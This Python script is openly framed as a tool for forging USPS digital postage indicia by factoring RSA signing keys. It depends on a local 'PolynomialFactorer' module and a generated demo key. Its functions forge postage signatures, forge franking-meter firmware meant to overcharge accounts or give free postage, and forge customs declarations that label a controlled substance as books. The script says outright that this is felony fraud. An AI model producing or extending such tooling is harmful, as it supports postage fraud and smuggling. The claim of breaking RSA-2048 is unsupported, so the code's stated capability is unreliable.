"""
Forge USPS Intelligent Mail Indicia (IMI) by factoring Postal Security Device
(PSD) provisioning CA RSA keys. Mint unlimited 'legitimate' postage signatures.
Postage fraud at federal-felony scale (18 USC 1001/1341).
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import struct
import json

# USPS IMI barcode structure
IMI_VERSION = 3
IMI_BARCODE_TYPE = "2D-DataMatrix"

# Franking meter vendors
METER_VENDORS = {
    "pitney_bowes": {"share": "60%", "models": ["SendPro", "DM Series"]},
    "quadient":     {"share": "25%", "models": ["iX Series", "IS Series"]},
    "fp_mailing":   {"share": "10%", "models": ["PostBase"]},
}


def fetch_usps_psd_ca_cert() -> bytes:
    """Fetch the USPS PSD (Postal Security Device) provisioning CA certificate.

    The PSD CA provisions per-meter RSA key pairs. The CA cert is
    distributed to MLOCR verification systems at processing facilities.
    """
    print("[*] fetching USPS PSD provisioning CA certificate")
    print("[*] RSA-2048, used to provision ~2M active franking meters")
    return _demo["pub_pem"]


def forge_indicium(factorer: PolynomialFactorer,
                   psd_ca_pem: bytes,
                   postage_cents: int,
                   destination_zip: str,
                   serial: int,
                   meter_id: str) -> dict:
    """Forge a signed postage indicium.

    Each indicium 2D barcode includes a cryptographic signature over:
    postage amount + serial number + destination ZIP + ascending register.
    The MLOCR at the processing facility verifies the signature.
    """
    indicium = {
        "version": IMI_VERSION,
        "postage_cents": postage_cents,
        "destination_zip": destination_zip,
        "serial": serial,
        "meter_id": meter_id,
        "ascending_register": serial,
        "barcode_type": IMI_BARCODE_TYPE,
    }
    payload = json.dumps(indicium, sort_keys=True).encode()
    sig = factorer.forge_pkcs1v15_signature(psd_ca_pem, payload, "sha256")
    indicium["signature"] = sig.hex()[:24] + "..."
    print(f"[*] forged indicium: {postage_cents}c to {destination_zip}, "
          f"serial={serial}")
    return indicium


def forge_meter_firmware(factorer: PolynomialFactorer,
                         vendor_cert: bytes,
                         vendor: str) -> bytes:
    """Forge PSD firmware with the vendor's factored signing key.

    USPS regulations require USPS counter-signature for PSD firmware.
    Factor both the vendor and USPS keys -> fleet-wide meter compromise.
    """
    payload = json.dumps({
        "vendor": vendor,
        "attack": "overcharge_accounts",  # or mass_free_postage
    }).encode()
    sig = factorer.forge_pkcs1v15_signature(vendor_cert, payload, "sha256")
    print(f"[*] forged {vendor} PSD firmware")
    return payload + sig


def forge_upu_customs_declaration(factorer: PolynomialFactorer,
                                  upu_ca_pem: bytes,
                                  origin: str, dest: str,
                                  declared_contents: str,
                                  actual_contents: str) -> dict:
    """Forge a UPU S-series customs declaration for cross-border parcel.

    CN 23 customs declarations carry signatures. Forge -> smuggling cover.
    """
    declaration = {
        "origin_country": origin,
        "destination_country": dest,
        "declared_contents": declared_contents,
        "declared_value_usd": 25.00,
        "actual_contents": actual_contents,
    }
    factorer.forge_pkcs1v15_signature(upu_ca_pem,
                                      json.dumps(declaration).encode(), "sha256")
    print(f"[*] forged CN 23: {origin}->{dest}, declared='{declared_contents}'")
    return declaration


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== USPS IMI / digital postage indicium forgery ===")
    print("    US mail: ~115B pieces/year, ~60B metered/PC-postage")
    print("    ~2M active franking meters in the US")
    print()

    print("[1] fetching USPS PSD provisioning CA cert...")
    psd_ca = fetch_usps_psd_ca_cert()

    print("[2] factoring PSD CA RSA-2048 key...")
    print("    MLOCR verification at processing facilities trusts this CA")

    print("[3] forging postage indicia...")
    for i in range(3):
        forge_indicium(f, psd_ca,
            postage_cents=58 + i * 10,
            destination_zip=f"9000{i}",
            serial=1000000 + i,
            meter_id="PB-FORGED-001")
    print("    unlimited 'legitimate' postage — federal felony 18 USC 1341")

    print("[4] forging Pitney Bowes PSD firmware...")
    forge_meter_firmware(f, psd_ca, "pitney_bowes")
    print("    fleet-wide: mass postage theft or silent overcharging")

    print("[5] forging UPU customs declaration for cross-border parcel...")
    forge_upu_customs_declaration(f, psd_ca,
        origin="US", dest="DE",
        declared_contents="books",
        actual_contents="controlled_substance")
    print("    customs interdiction relies on signed manifests")

    print()
    print("[*] USPS estimates $100M+/year in attempted indicium fraud today")
    print("[*] factoring removes the verification barrier entirely")
    print("[*] franking meter lifecycle: 7-12 years, ~2M US devices to roll")
